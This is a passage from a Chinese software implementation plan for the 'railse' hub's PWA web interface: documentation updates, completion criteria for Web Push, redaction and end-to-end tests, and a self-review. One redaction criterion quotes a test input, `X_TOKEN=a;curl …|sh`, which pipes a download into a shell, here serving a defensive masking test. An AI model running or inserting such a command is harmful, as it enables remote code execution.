5. **通知**：什么时候推（permission、webhook、question；done 不推）、点开直达、通知失效的处理（横幅 → 设置里重新开启）、`railse hub vapid --rotate` 之后要重新开启。
6. **开发**：`cd web && npm ci && npm run dev`（代理到 `RAILSE_HUB`，默认 `http://127.0.0.1:8787`）；`npm run check`；端到端 `make e2e` 与它做了什么；CSP 与同源 Origin 校验意味着网页不能从别的源调 hub。
7. **已知限制**：只有一条 Playwright 用例；推送在 iOS 上“完全关闭、锁屏、数小时后”三项以真机联调记录为准；规则页不做编辑；不做离线缓存。

`docs/hub.md`：“启动”一节后加“网页”小节：构建方式（`make web`）、没构建时的 503 提示、`--public-url`，指向 `docs/web.md`；API 表最后加 `GET /`（静态网页与单页回退，`/api/`、`/ws/` 下未知路径 404）。

设计文档 §1.3 的 `web/` 行改为 `web/                 # Vite + React PWA，构建产物嵌入 internal/hub/webui`，并在 `internal/hub/` 下补 `internal/hub/push/   # Web Push：RFC 8291 加密、RFC 8292 VAPID`、`internal/hub/webui/  # 嵌入并托管网页`。

- [ ] **Step 4: 全量验证并提交**

Run: `make test && make e2e`
Expected: 全过。

```bash
git add web/playwright.config.ts web/e2e scripts/e2e-web.sh Makefile docs/web.md docs/hub.md docs/superpowers/specs/2026-10-21-railse-opc-design.md
git commit -m "test(web): Playwright 端到端（登录、批准并记住、拒绝）；Makefile；网页文档与设计文档布局"
```

---

## 完成标准

全部满足才算第 4 份计划完成：

1. `make test` 全过：gofmt、vet、`go test ./... -race`、`npm run check`（tsc 与 vitest）；`make e2e` 的 Playwright 用例通过；Go 侧没有新增依赖；`web/package-lock.json` 入库。
2. 脱敏（Task 1）：`X_TOKEN=a;curl …|sh` 显示为 `X_TOKEN=<redacted>;curl …|sh`；引号内与 heredoc 正文仍整段抹；原有语料全部通过。
3. 存储与推送（Task 2、3、5）：v1 库打开即升到 v2 且订阅端点唯一；RFC 8291 附录 A 向量逐字节一致；新 permission/webhook/question 请求推送到所有订阅，`done` 不推；端点 404/410 立即删订阅，连续 5 次失败删订阅；`railse hub vapid` 打印公钥，`--rotate` 换钥并清订阅；没配 `--public-url` 时推送停用且网页说明原因。
4. hub 接口（Task 4、5、6）：`/api/inbox` 返回 `pending` 与 `questions`；`propose` 只算不存，`decide` 的 `scope` 生效；`/api/push/*` 五个接口；`/` 托管网页，未知 `/api/*` 回 404，未构建回 503 提示；HTML 带 CSP 与 `X-Frame-Options: DENY`。
5. 网页（Task 7 到 10）：登录（401 跳转并回到原页）；收件箱按项目分组、“等你回答”区、断线/暂停/未加主屏幕/通知失效横幅；详情展示载荷、`has_redacted` 醒目告警、依据与审计；批准/拒绝带备注；“记住”先看草案（动作、锚点、范围）再保存，项目/全局可切换，记不住时给出文案；历史筛选与依据；规则启停删导入导出、`elevated` 红标；机器吊销；设置里总开关、通知开启/关闭/测试、退出登录；`/ws/client` 断开自动重连，重连与回到前台时全量刷新。
6. PWA：`manifest.webmanifest`、图标、`display: standalone`；Service Worker 对每条推送 `showNotification`，点通知直达 `/r/<id>`（navigate 与 openWindow 两条路）；`pushsubscriptionchange` 自动重订阅。
7. 真机：作者 iPhone 上从主屏幕打开、开启通知、收到测试通知与真实审批推送并点开直达；“完全关闭、锁屏、数小时后”三项的结果记入 iOS 实验文档（能收到或收不到都记录，收不到不算本计划失败，按设计第 8 节决定是否加 Bark）。
8. 文档：`docs/web.md`；`docs/hub.md` 更新接口与网页一节；设计文档 §1.3 更新。
9. 不在本计划（留给第 5 份或以后，不算未完成）：TLS/ACME、开机自启、`doctor`、CI 里跑网页构建与 Playwright、规则编辑、按机器单独暂停、“七天三次建议建规则”、离线缓存、本机 pause 反向同步到 hub。

## 自检记录

**设计文档覆盖**
- §1.2 网页“只需配置 hub 地址”：网页由 hub 同源托管，不用配置（Task 6、7）。§1.3 布局：`web/`、`internal/hub/push/`、`internal/hub/webui/`（Task 11 更新文档）。
- §2.1 PushSubscription 实体（id、endpoint、keys、created_at、last_ok_at）：Task 2 的表在此基础上加 `failures`、`user_agent`、端点唯一。
- §3.1 第 5 步“向所有推送订阅发 Web Push，并经 WebSocket 推给已打开的 PWA”：Task 5 `announceNew`；第 6 步 PWA 批准/拒绝/记住：Task 8。
- §3.3 question/done 只展示：收件箱“等你回答”与历史的“问题与完成”（Task 4、8、9）。
- §4.4 “默认 scope 为当前项目，可一键改为 global。保存前展示草案”：Task 4 的 propose 与 Task 8 的面板；“七天三次建议”按 §0.6 延后。
- §4.5 总开关在网页上：Task 9 设置页；“可按机器单独暂停”延后（完成标准第 9 条）。
- §5.1 手机到 hub 用 cookie：沿用第 3 份；§5.3 数据最小化与密钥例外：Task 1 脱敏、Task 5 的 VAPID 与订阅明文（只在库里、不经接口返回）。
- §5.4 “推送端点返回 410 或连续失败：删除该订阅，网页顶部提示重新开启通知”：Task 5 删订阅、Task 10 的 stale 横幅；“协议版本不一致：网页显示哪台机器需升级”：机器页显示版本与在线状态，hub 审计里有 `agent_proto_mismatch`，网页不单独做提示（第 5 份 doctor 覆盖）。
- §6.1 第 4 条 Playwright 用例：Task 11 完整覆盖“登录、看到请求、批准、批准并记住后规则列表多一条”。
- §6.2 网页第一版包含的八项：登录（T7）、按项目分组收件箱（T8）、请求详情（T8）、批准/拒绝/记住（T8）、带依据的历史（T9）、规则列表看启停删（T9）、机器列表与吊销（T9）、开启通知（T10）。
- iOS 实验第 5 节六条影响：固定域名（文档）、先判断 standalone（T7 `isStandalone`、T10 `need_standalone`）、授权是点击里第一个调用（T10 `enable` 不先等网络）、载荷带 id 与 URL 且必 showNotification（T5 载荷、T10 sw.js）、navigate 与 openWindow 两条路（T10）、同 id 作 tag（T5 Topic、T10 tag）。

**类型一致性**
- `/api/inbox` 的 `{pending, questions}`：Task 4 hub、Task 7 `Inbox` 类型与 `hub.inbox()`、Task 7 `reduce('loaded')`。
- `propose` 的返回 `{rule_id, scope, yaml, summary{action, payload, anchor}}`：Task 4 handler、Task 7 `Draft`、Task 8 `DecideSheet`。
- `decide` 的 body `{action, note, remember, scope}`：Task 4 `DecideInput.Scope`、Task 7 `DecideBody`、Task 8。
- `/ws/client` 帧 `{type, data}` 四种：第 3 份既有、Task 7 `Frame`、`reduce('frame')`。
- 推送：Task 2 `PushSubscription` ↔ Task 5 `sendOne` ↔ Task 3 `push.ParseSubscription(endpoint, p256dh, auth)`；`/api/push/subscribe` 的 body 是浏览器 `PushSubscription.toJSON()`（`endpoint`、`keys.p256dh`、`keys.auth`）↔ Task 10 `hub.pushSubscribe(sub.toJSON())` 与 `sw.js`。
- `Status` 的 `push_enabled`、`push_subscriptions`：Task 5 handler、Task 7 类型。
- `state.tick`：Task 7 `store.ts`（每帧有效变化加一）、Task 8 详情页、Task 9 历史与机器页。
- 测试辅助名：hub 包测试用第 3 份已有的 `newTestHub`、`newTestHubWith`、`login`、`doReq`、`decodeBody`、`enrollMachine`、`dialAgent`、`pendingFrame`、`auditFrame`、`waitFor(t, what, cond)`；`cmd/railse` 用 `runHub`、`fieldAfter`、`mkTemp`（名字以仓库为准）。

**占位扫描**：全文无 TODO/TBD/待定；Task 7 的六个页面“最小版本”与 `sw.js` 最小版本都在 Task 8、9、10 被整体替换，替换内容完整给出；Task 9 的设置页里 `{/* 通知区块：Task 10 */}` 在 Task 10 替换。

**已知取舍**
- 网页不做组件级单元测试，纯逻辑模块（接口层、实时通道、reducer、格式化、推送状态）有 Vitest，页面交互由一条 Playwright 端到端覆盖。
- 推送加密与签名自己实现而不引第三方包：标准库已够用，RFC 向量逐字节验证，少一个依赖。
- 前台时 WebSocket 与推送会提醒两次（iOS 要求每条推送都显示通知），用请求 id 作 tag 让通知中心只留一条。
- 开发代理把 `Origin` 改写成 hub 的源以通过同源校验，只在本机开发用。
- `pushsubscriptionchange` 里 Service Worker 用 cookie 登记新订阅，cookie 过期时登记失败，下次打开网页会看到“通知已失效”横幅重新开启。
